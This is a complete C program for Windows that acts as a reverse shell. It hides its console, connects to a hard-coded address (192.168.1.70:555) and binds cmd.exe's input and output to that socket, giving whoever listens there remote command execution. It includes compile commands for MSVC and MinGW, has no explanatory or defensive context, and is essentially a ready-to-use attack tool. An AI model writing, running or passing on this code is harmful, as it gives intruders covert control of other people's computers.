#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <errno.h>
#define RIP "192.168.1.70"
#define RPORT 555
#pragma comment(lib,"WS2_32.lib")

//compile with msvc : cl.exe tmp.c /TC /link ws2_32.lib
//compile with mingw : gcc tmp.c -o tmp.exe -lws2_32


void Initialize_Winsock(void)
{
    WSADATA wsa;

    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0) {
        fprintf(stderr,"[-] Error intialize winsock !\n");
        exit(-1);
    }
}

void WSAstrerror(int errorcode)
{
    char buffer[256] = {0};
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,NULL,errorcode,MAKELANGID(LANG_NEUTRAL,SUBLANG_DEFAULT),buffer,255,NULL);
    fprintf(stderr,"[-] Error %d : %s\n",errorcode,buffer);
}

void ExecuteAndStreamProcess(SOCKET fd,char *process)
{
    STARTUPINFOA sinfo = {0};
    PROCESS_INFORMATION pinfo = {0};

    memset(&sinfo,0,sizeof(sinfo));
    memset(&pinfo,0,sizeof(pinfo));

    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.hStdError = (HANDLE)fd;
    sinfo.hStdInput = (HANDLE)fd;
    sinfo.hStdOutput = (HANDLE)fd;
    
    if (CreateProcessA(NULL,(LPSTR)process,NULL,NULL,TRUE,0,NULL,NULL,&sinfo,&pinfo) == 0)
        return;
    
    WaitForSingleObject(pinfo.hProcess,INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hProcess);
}

int main(int argc,char **argv)
{
    FreeConsole();
    struct sockaddr_in socks = {0};
    Initialize_Winsock();
    SOCKET fd = WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0);

    if (fd == INVALID_SOCKET){
        WSAstrerror(WSAGetLastError());
        exit(EXIT_FAILURE);
    }

    socks.sin_addr.s_addr = inet_addr(RIP);
    socks.sin_port = htons(RPORT);
    socks.sin_family = AF_INET;

    if (WSAConnect(fd,(struct sockaddr *)&socks,sizeof(socks),NULL,NULL,NULL,NULL) == SOCKET_ERROR){
        WSAstrerror(WSAGetLastError());
        exit(EXIT_FAILURE);
    }

    ExecuteAndStreamProcess(fd,"cmd.exe");

    closesocket(fd);

    WSACleanup();

    return (0);
}